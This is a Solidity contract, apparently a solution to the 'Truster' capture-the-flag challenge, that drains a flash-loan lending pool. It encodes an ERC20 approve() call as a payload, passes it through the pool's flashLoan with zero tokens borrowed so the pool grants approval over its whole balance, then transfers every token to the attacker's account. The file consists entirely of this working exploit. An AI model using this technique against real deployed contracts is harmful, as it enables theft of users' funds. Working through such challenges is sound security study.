// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./ITrusterLenderPool.sol";

import "hardhat/console.sol";

contract AttackTruster {
    constructor() {}

    function attackTruster(
        IERC20 token,
        ITrusterLenderPool pool,
        address attacker
    ) public {
        // get balance of the truster lender pool
        uint256 poolBalance = token.balanceOf(address(pool));
        console.log("poolBalance: ", poolBalance);
        // create payload -> approve this contract which will call the transferFrom
        bytes memory approvePayload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );
        console.log("approvePayload: ");
        console.logBytes(approvePayload);
        // loan 0 tokens to an attacker account and create approval on
        // token contract
        pool.flashLoan(0, attacker, address(token), approvePayload);
        // and transfer approved tokens to attacker's EOA
        token.transferFrom(address(pool), attacker, poolBalance);
    }
}
